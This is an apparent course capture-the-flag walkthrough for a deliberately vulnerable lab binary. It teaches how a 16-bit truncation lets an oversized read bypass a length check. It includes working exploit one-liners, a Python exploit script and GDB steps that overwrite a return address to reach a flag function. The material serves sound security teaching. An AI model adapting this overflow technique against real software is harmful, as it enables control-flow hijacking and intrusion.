# Integer Overflow Walkthrough

## What this challenge teaches

- Integer overflow can bypass length checks.
- The overflow itself is usually not the final goal.
- Here, overflow bypasses a size check and enables a classic return-address overwrite.

---

## Vulnerable idea in one minute

The program reads a number `count`, then computes bytes two different ways:

- Checked value: `checked_bytes = (uint16_t)(count * 8)`
- Read value: `read(..., (size_t)count * 8)`

If `count * 8` is large, casting to `uint16_t` keeps only the low 16 bits.
So the check can see a tiny value while `read` still uses a huge value.

That lets us pass the check and still overflow `buf[64]`.

---

## Build the challenge

```bash
cd /home/jbenjam7/cs466/ctf/12-integer-overflow
gcc -O0 -fno-stack-protector -no-pie -o challenge challenge.c
```

Quick run:

```bash
./challenge
```

You should see a leaked `jump()` address and the prompt.

---

## Manual solve (exam style)

### Exact inputs (copy/paste)

Use these first so the process is concrete.

1. Sanity check (should fail check):

```bash
printf '9\n' | ./challenge
```

Expected:

```text
Too large!
Goodbye!
```

2. Real exploit input for this compiled binary (`jump() @ 0x401218`):

```bash
(printf '8193\n'; python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + bytes.fromhex("1812400000000000"))') | ./challenge
```

Expected:

```text
cosc466-flag-{1nt3g3r_0v3rfl0w}
```

The 8-byte address at the end is little-endian `0x0000000000401218`.

3. If address changes in your build, generate the last 8 bytes dynamically:

```bash
python3 - <<'PY'
import re
import struct
import subprocess

p = subprocess.Popen(["./challenge"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
banner = p.stdout.readline() + p.stdout.readline()
text = banner.decode("latin1", errors="ignore")
print(text, end="")

m = re.search(r"jump\(\) @ (0x[0-9a-fA-F]+)", text)
addr = int(m.group(1), 16)

payload = b"8193\n" + b"A" * 88 + struct.pack("<Q", addr)
p2 = subprocess.Popen(["./challenge"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, _ = p2.communicate(payload)
print(out.decode("latin1", errors="ignore"), end="")
PY
```

### 1. Pick a `count` that overflows the check

Use:

- `count = 8193`
- `count * 8 = 65544`
- As `uint16_t`: `65544 mod 65536 = 8`

Check sees `8` (safe), but `read` uses `65544`.

### 2. Find stack offset to return address

For this binary layout, offset is:

- 64 bytes for `buf`
- 24 bytes of other locals/padding in this frame
- return address starts at byte 88

So payload starts with 88 filler bytes, then `jump()` address.

### 3. Craft payload

Payload structure:

- `A * 88`
- little-endian `jump()` address

### 4. Send it

Use the provided script:

```bash
./exploit.py
```

Expected success:

```text
cosc466-flag-{1nt3g3r_0v3rfl0w}
```

---

## GDB learning method (best for understanding the exploit)

This section walks you through using GDB to understand exactly how the overflow works, step by step.

### GDB Step 1: Start GDB and view the vulnerable function

```bash
gdb -q ./challenge
```

Once GDB starts, disassemble `vuln`:

```gdb
disassemble vuln
```

You'll see something like:

```asm
Dump of assembler code for function vuln:
   0x0000000000401144 <+0>:     push   rbp
   0x0000000000401145 <+1>:     mov    rbp,rsp
   0x0000000000401148 <+4>:     sub    rsp,0x60
   ...
   0x000000000040117f <+59>:    call   0x401060 <read@plt>
   ...
   0x0000000000401189 <+69>:    leave
   0x000000000040118a <+70>:    ret
End of assembler code.
```

**Key observation:**
- `sub rsp,0x60` = allocate 96 bytes (0x60) on the stack
- Our 64-byte buffer is near the start, and saved RBP/return address are further down

### GDB Step 2: Set a breakpoint after `read()`

The `read()` call is at offset +59. We want to break right after it so we can inspect the stack before the epilogue.

```gdb
break *vuln+62
```

(+62 is just after the call instruction)

### GDB Step 3: Run with a normal count first

```gdb
run
```

When prompted for count, type:

```
1
```

When prompted for payload, type a few bytes (e.g. `test`), then Ctrl+D to EOF.

GDB should stop at your breakpoint. Now inspect the stack:

```gdb
x/12gx $rsp
```

You'll see 12 8-byte values starting from the current stack pointer. Note where your `test` bytes appear.

### GDB Step 4: Continue and observe normal exit

```gdb
continue
```

You should see "Goodbye!" and the program ends normally.

### GDB Step 5: Run again with the overflow count

Start a fresh run:

```gdb
run
```

When prompted for count, this time type:

```
8193
```

When prompted for payload, send the malicious 88 bytes + address:

```
(printf 'A%.0s' {1..88}; printf '\x18\x12\x40\x00\x00\x00\x00\x00')
```

Or just paste pre-crafted hex (if you prepared it):

```gdb
# Paste from terminal: 88 A's followed by the 8-byte little-endian address 0x401218
```

GDB will stop at the breakpoint again.

### GDB Step 6: Inspect the stack before epilogue

Now examine where your payload landed:

```gdb
x/12gx $rsp
```

You should see `0x4141414141414141` (AAAA in hex) repeated many times.

### GDB Step 7: Dump the exact return address location

The return address is on the stack. Find it by examining memory near RBP:

```gdb
x/2gx $rbp
```

Output:
- First 8 bytes: the saved RBP
- Second 8 bytes: the return address (should now be `0x0000000000401218` if overflow succeeded)

If you see that value, the overflow worked!

### GDB Step 8: Step through the epilogue

```gdb
stepi
```

This executes `leave`, which restores RSP and RBP from your fake frame. Then:

```gdb
stepi
```

This executes `ret`, which should jump to `0x401218` (jump function).

### GDB Step 9: Observe the flag print

```gdb
continue
```

You should see:

```text
cosc466-flag-{1nt3g3r_0v3rfl0w}
```

Then the program exits via `_exit(0)`.

---

## Why this is an integer-overflow challenge

The key bug is not just "big input".
The key bug is mismatch caused by overflow/truncation:

- security check uses truncated 16-bit value
- dangerous operation uses full-size value

That mismatch is the exam concept to recognize.

---

## Multiple-select facts to remember

- Unsigned arithmetic wraps modulo `2^n`.
- Casting to a smaller integer type truncates high bits.
- Overflow can turn a large value into a small checked value.
- The exploit often comes from what happens after the overflow (copy, index, allocation).
- Signed overflow in C is undefined behavior.

---

## One-line takeaway

Choose input so arithmetic wraps in the check path but not in the use path, then use the resulting bound bypass to reach control-flow corruption.
